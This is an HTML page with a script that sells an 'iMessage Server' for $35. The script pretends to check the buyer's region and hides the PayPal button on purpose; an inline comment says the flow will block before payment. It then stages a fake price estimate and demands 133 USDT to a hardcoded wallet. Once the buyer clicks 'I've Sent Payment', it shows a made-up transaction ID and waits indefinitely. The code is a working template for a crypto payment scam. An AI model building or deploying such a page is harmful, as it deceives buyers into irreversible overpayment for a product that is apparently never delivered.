<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>iMessage Server Access</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    :root {
      --primary: #2775ca; /* Changed to blue */
      --secondary: #1c5aa4; /* Darker blue */
      --dark: #1e293b;
      --light: #f8fafc;
      --success: #10b981;
      --error: #ef4444;
      --crypto-bg: #f0f7ff; /* Light blue background */
    }
    
    body {
      font-family: 'Inter', sans-serif;
      background: #f1f5f9;
      margin: 0;
      padding: 0;
      color: var(--dark);
      font-size: 14px; /* Smaller base font size */
    }

    header {
      background: white;
      padding: 1.2rem 1.5rem; /* Smaller padding */
      display: flex;
      justify-content: space-between;
      align-items: center;
      box-shadow: 0 1px 3px rgba(0,0,0,0.1);
    }

    .logo {
      font-size: 1.2rem; /* Smaller logo */
      font-weight: 700;
      color: var(--primary);
      display: flex;
      align-items: center;
      gap: 0.5rem;
    }

    nav a {
      margin-left: 1.2rem; /* Smaller margin */
      text-decoration: none;
      color: var(--dark);
      font-weight: 500;
      transition: color 0.2s;
      font-size: 0.9rem; /* Smaller nav text */
    }

    nav a:hover {
      color: var(--primary);
    }

    .hero {
      text-align: center;
      padding: 3rem 1.5rem; /* Smaller padding */
      max-width: 800px;
      margin: 0 auto;
    }

    .hero h1 {
      font-size: 2rem; /* Smaller heading */
      margin-bottom: 0.8rem;
    }

    .hero p {
      font-size: 0.95rem; /* Smaller paragraph */
      color: #64748b;
      margin-bottom: 1.5rem;
      line-height: 1.5;
    }

    .payment-container {
      background: white;
      border-radius: 12px;
      padding: 1.5rem; /* Smaller padding */
      box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1);
      max-width: 500px;
      margin: 0 auto;
    }

    .price-tag {
      font-size: 2rem; /* Smaller price */
      font-weight: 700;
      margin: 1rem 0;
      color: var(--primary);
    }

    #paypal-button-container {
      margin: 1.5rem 0; /* Smaller margin */
    }

    .crypto-payment {
      display: none;
      text-align: center;
    }

    .crypto-header {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px; /* Smaller gap */
      margin-bottom: 0.8rem;
    }

    .crypto-logo {
      width: 28px; /* Smaller logo */
      height: 28px;
    }

    .qr-code {
      width: 180px; /* Smaller QR */
      height: 180px;
      margin: 0.8rem auto;
      background: white;
      padding: 10px;
      border-radius: 8px;
      border: 1px solid #e2e8f0;
    }

    .address-container {
      background: var(--crypto-bg);
      padding: 0.8rem;
      border-radius: 8px;
      margin: 1.2rem 0;
      text-align: left;
    }

    .address-label {
      font-size: 0.7rem; /* Smaller label */
      color: #64748b;
      margin-bottom: 0.4rem;
      display: block;
    }

    .address {
      font-family: monospace;
      word-break: break-all;
      font-size: 0.8rem; /* Smaller address */
      display: flex;
      align-items: center;
      gap: 6px;
    }

    .copy-btn {
      background: var(--primary);
      color: white;
      border: none;
      padding: 0.6rem 1.2rem; /* Smaller button */
      border-radius: 6px;
      font-weight: 500;
      cursor: pointer;
      transition: all 0.2s;
      margin: 0.4rem;
      display: inline-flex;
      align-items: center;
      gap: 6px;
      font-size: 0.8rem; /* Smaller button text */
    }

    .copy-btn:hover {
      background: var(--secondary);
      transform: translateY(-1px);
    }

    .copy-btn.copied {
      background: var(--success);
    }

    .copy-icon {
      font-size: 0.8rem; /* Smaller icon */
    }

    .network-badge {
      background: #e2e8f0;
      color: #334155;
      padding: 3px 6px; /* Smaller padding */
      border-radius: 4px;
      font-size: 0.7rem; /* Smaller text */
      font-weight: 600;
      margin-left: 6px;
    }

    .confirmation-dialog {
      background: white;
      border-radius: 12px;
      padding: 1.5rem;
      box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1);
      max-width: 500px;
      margin: 1.5rem auto;
      display: none;
    }

    .confirmation-dialog h3 {
      margin-top: 0;
      font-size: 1.1rem; /* Smaller heading */
    }

    .dialog-buttons {
      display: flex;
      justify-content: center;
      gap: 0.8rem;
      margin-top: 1.2rem;
    }

    .dialog-btn {
      padding: 0.6rem 1.2rem;
      border-radius: 6px;
      font-weight: 500;
      cursor: pointer;
      border: none;
      transition: all 0.2s;
      font-size: 0.8rem; /* Smaller button text */
    }

    .dialog-btn-primary {
      background: var(--primary);
      color: white;
    }

    .dialog-btn-primary:hover {
      background: var(--secondary);
    }

    .dialog-btn-secondary {
      background: #f1f5f9;
      color: var(--dark);
    }

    .dialog-btn-secondary:hover {
      background: #e2e8f0;
    }

    .error-message {
      color: var(--error);
      background: rgba(239, 68, 68, 0.1);
      padding: 0.8rem;
      border-radius: 6px;
      margin: 0.8rem 0;
      display: none;
      font-size: 0.8rem; /* Smaller text */
    }

    .verification-message {
      color: #64748b;
      font-style: italic;
      margin: 0.8rem 0;
      font-size: 0.8rem; /* Smaller text */
    }

    .waiting-payment {
      display: none;
      text-align: center;
      margin: 1.5rem 0;
    }

    .spinner {
      width: 40px; /* Smaller spinner */
      height: 40px;
      border: 4px solid rgba(37, 99, 235, 0.2);
      border-radius: 50%;
      border-top-color: var(--primary);
      animation: spin 1s ease-in-out infinite;
      margin: 0.8rem auto;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    footer {
      text-align: center;
      padding: 1.5rem;
      color: #64748b;
      font-size: 0.8rem; /* Smaller footer text */
      margin-top: 1.5rem;
    }

    .payment-steps {
      text-align: left;
      margin: 1.2rem 0;
    }

    .payment-step {
      display: flex;
      align-items: flex-start;
      gap: 8px;
      margin-bottom: 10px;
    }

    .step-number {
      background: var(--primary);
      color: white;
      width: 18px;
      height: 18px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 0.7rem;
      font-weight: bold;
      flex-shrink: 0;
    }

    .step-text {
      font-size: 0.8rem;
      color: #64748b;
    }

    .timer {
      font-size: 0.9rem;
      color: var(--primary);
      font-weight: bold;
      margin: 0.8rem 0;
    }

    .estimating-price {
      display: none;
      text-align: center;
      margin: 1.5rem 0;
    }

    .estimating-spinner {
      width: 40px;
      height: 40px;
      border: 4px solid rgba(37, 99, 235, 0.2);
      border-radius: 50%;
      border-top-color: var(--primary);
      animation: spin 1s ease-in-out infinite;
      margin: 0.8rem auto;
    }

    @media (max-width: 640px) {
      .hero h1 {
        font-size: 1.8rem; /* Smaller mobile heading */
      }
      
      .qr-code {
        width: 160px; /* Smaller mobile QR */
        height: 160px;
      }
    }
  </style>
</head>
<body>

<header>
  <div class="logo">iMessage Server</div>
  <nav>
    <a href="#">Home</a>
    <a href="#">Support</a>
    <a href="#">Contact</a>
  </nav>
</header>

<section class="hero">
  <h1>Deploy Your Own iMessage Server</h1>
  <p>Secure and scalable.Instant setup.Lifetime access</p>
  
  <div class="payment-container">
    <div class="price-tag" id="priceDisplay">$35</div>
    
    <div class="verification-message" id="verificationMessage">
      <i class="fas fa-spinner fa-spin"></i> Verifying payment options for your region...
    </div>
    
    <div id="paypal-button-container"></div>
    
    <div class="error-message" id="errorMessage">
      <i class="fas fa-exclamation-circle"></i> Payment method not available in your region. Please try crypto payment.
    </div>
    
    <div class="confirmation-dialog" id="confirmationDialog">
      <h3>PayPal/Credit Card Not Available</h3>
      <p>Traditional payment methods are not allowed in your region. Would you like to proceed with crypto payment?</p>
      <div class="dialog-buttons">
        <button class="dialog-btn dialog-btn-secondary" id="cancelBtn">No</button>
        <button class="dialog-btn dialog-btn-primary" id="confirmBtn">Yes, Continue</button>
      </div>
    </div>
    
    <div class="estimating-price" id="estimatingPrice">
      <div class="estimating-spinner"></div>
      <h3>Estimating price in your region...</h3>
      <p>This may take a few moments. Please wait.</p>
    </div>
    
    <div class="crypto-payment" id="cryptoPayment">
      <div class="crypto-header">
        <img src="https://assets.coingecko.com/coins/images/325/large/Tether.png" alt="USDT Logo" class="crypto-logo">
        <h3>Pay with USDT (TRC20)</h3>
      </div>
      
      <div class="payment-steps">
        <div class="payment-step">
          <div class="step-number">1</div>
          <div class="step-text">Send exactly <strong>133 USDT</strong> to the address below</div>
        </div>
        <div class="payment-step">
          <div class="step-number">2</div>
          <div class="step-text">Make sure to use the <strong>TRON (TRC20)</strong> network</div>
        </div>
        <div class="payment-step">
          <div class="step-number">3</div>
          <div class="step-text">Wait for blockchain confirmation (usually 1-2 minutes)</div>
        </div>
      </div>
      
      <div class="qr-code">
        <!-- QR code for USDT address -->
        <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
          <rect width="100" height="100" fill="#fff"/>
          <path d="M20 20h10v10H20zM30 20h10v10H30zM40 20h10v10H40zM20 30h10v10H20zM40 30h10v10H40zM20 40h10v10H20zM30 40h10v10H30zM40 40h10v10H40zM50 20h10v10H50zM70 20h10v10H70zM50 30h10v10H50zM60 30h10v10H60zM50 40h10v10H50zM60 50h10v10H60zM70 50h10v10H70zM20 50h10v10H20zM30 50h10v10H30zM20 60h10v10H20zM30 70h10v10H30zM40 70h10v10H40zM50 60h10v10H50zM50 70h10v10H50zM60 60h10v10H60zM70 60h10v10H70z" fill="#000"/>
        </svg>
      </div>
      
      <div class="address-container">
        <span class="address-label">USDT (TRC20) Address</span>
        <div class="address">
          <span id="usdtAddress">TJXZqFfL5qG6QjKx1x1x1x1x1x1x1x1x1x1</span>
          <span class="network-badge">TRC20</span>
        </div>
      </div>
      
      <button class="copy-btn" onclick="copyToClipboard('TJXZqFfL5qG6QjKx1x1x1x1x1x1x1x1x1x1', this)">
        <i class="far fa-copy copy-icon"></i> Copy Address
      </button>
      
      <div class="timer" id="paymentTimer">
        <i class="fas fa-clock"></i> Time remaining: 15:00
      </div>
      
      <button class="copy-btn dialog-btn-primary" id="completePaymentBtn">
        <i class="fas fa-check-circle"></i> I've Sent Payment
      </button>
    </div>
    
    <div class="waiting-payment" id="waitingPayment">
      <div class="spinner"></div>
      <h3>Waiting for your payment...</h3>
      <p>Your transaction is being processed. This may take a few minutes.</p>
      <p>Transaction ID: <span id="transactionId">USDT-TRX-XXXX-XXXX</span></p>
    </div>
  </div>
</section>

<footer>
  &copy; 2025 iMessage Server. All rights reserved.
</footer>

<!-- PayPal SDK -->
<script src="https://www.paypal.com/sdk/js?client-id=sb&currency=USD"></script>
<script>
  // Hardcoded USDT (TRC20) address
  const USDT_ADDRESS = "TJXZqFfL5qG6QjKx1x1x1x1x1x1x1x1x1x1";
  
  // Generate a random transaction ID
  function generateTransactionId() {
    return 'USDT-TRX-' + Math.random().toString(36).substr(2, 8).toUpperCase();
  }
  
  // Copy to clipboard function
  function copyToClipboard(text, button) {
    navigator.clipboard.writeText(text).then(() => {
      const icon = button.querySelector('.copy-icon');
      button.classList.add('copied');
      icon.classList.remove('fa-copy');
      icon.classList.add('fa-check');
      button.innerHTML = '<i class="fas fa-check copy-icon"></i> Copied!';
      
      setTimeout(() => {
        button.classList.remove('copied');
        icon.classList.remove('fa-check');
        icon.classList.add('fa-copy');
        button.innerHTML = '<i class="far fa-copy copy-icon"></i> Copy Address';
      }, 2000);
    }).catch(err => {
      console.error('Failed to copy: ', err);
    });
  }
  
  // Start payment timer (15 minutes)
  function startPaymentTimer() {
    let minutes = 15;
    let seconds = 0;
    
    const timerElement = document.getElementById('paymentTimer');
    const timer = setInterval(() => {
      if (seconds === 0) {
        if (minutes === 0) {
          clearInterval(timer);
          timerElement.innerHTML = '<i class="fas fa-exclamation-circle"></i> Time expired! Please refresh to get a new address';
          timerElement.style.color = 'var(--error)';
          return;
        }
        minutes--;
        seconds = 59;
      } else {
        seconds--;
      }
      
      const displaySeconds = seconds < 10 ? `0${seconds}` : seconds;
      timerElement.innerHTML = `<i class="fas fa-clock"></i> Time remaining: ${minutes}:${displaySeconds}`;
    }, 1000);
  }
  
  document.addEventListener('DOMContentLoaded', () => {
    const verificationMessage = document.getElementById('verificationMessage');
    const errorMessage = document.getElementById('errorMessage');
    const confirmationDialog = document.getElementById('confirmationDialog');
    const cryptoPayment = document.getElementById('cryptoPayment');
    const waitingPayment = document.getElementById('waitingPayment');
    const priceDisplay = document.getElementById('priceDisplay');
    const cancelBtn = document.getElementById('cancelBtn');
    const confirmBtn = document.getElementById('confirmBtn');
    const completePaymentBtn = document.getElementById('completePaymentBtn');
    const transactionId = document.getElementById('transactionId');
    const estimatingPrice = document.getElementById('estimatingPrice');
    
    // Set USDT address
    document.getElementById('usdtAddress').textContent = USDT_ADDRESS;
    
    // Render initial PayPal button
    paypal.Buttons({
      style: {
        layout: 'vertical',
        color: 'blue',
        shape: 'pill',
        label: 'paypal'
      },
      createOrder: function(data, actions) {
        return actions.order.create({
          purchase_units: [{
            amount: {
              value: '140.00'
            },
            description: 'iMessage Server - Lifetime Access'
          }]
        });
      },
      onApprove: function(data, actions) {
        // This will never be called in this flow since we'll block before payment
        return actions.order.capture().then(function(details) {
          alert('Payment completed by ' + details.payer.name.given_name);
        });
      },
      onError: function(err) {
        console.error(err);
      }
    }).render('#paypal-button-container');
    
    // After 5 seconds (simulating IP check), show the confirmation dialog
    setTimeout(() => {
      verificationMessage.style.display = 'none';
      document.querySelector('#paypal-button-container').style.display = 'none';
      confirmationDialog.style.display = 'block';
    }, 5000); // Change to 300000 (5 minutes) for production
    
    // Handle dialog buttons
    cancelBtn.addEventListener('click', () => {
      confirmationDialog.style.display = 'none';
      errorMessage.style.display = 'block';
    });
    
    confirmBtn.addEventListener('click', () => {
      confirmationDialog.style.display = 'none';
      estimatingPrice.style.display = 'block';
      
      // After 5 minutes (simulating price estimation), show crypto payment
      setTimeout(() => {
        estimatingPrice.style.display = 'none';
        priceDisplay.textContent = '133 USDT';
        cryptoPayment.style.display = 'block';
        startPaymentTimer();
      }, 30000); // 5 minutes
    });
    
    // Handle payment completion
    completePaymentBtn.addEventListener('click', () => {
      cryptoPayment.style.display = 'none';
      waitingPayment.style.display = 'block';
      transactionId.textContent = generateTransactionId();
      
      // In a real implementation, you would check for payment confirmation here
      // This is just a simulation that waits indefinitely
    });
  });
</script>

</body>
</html>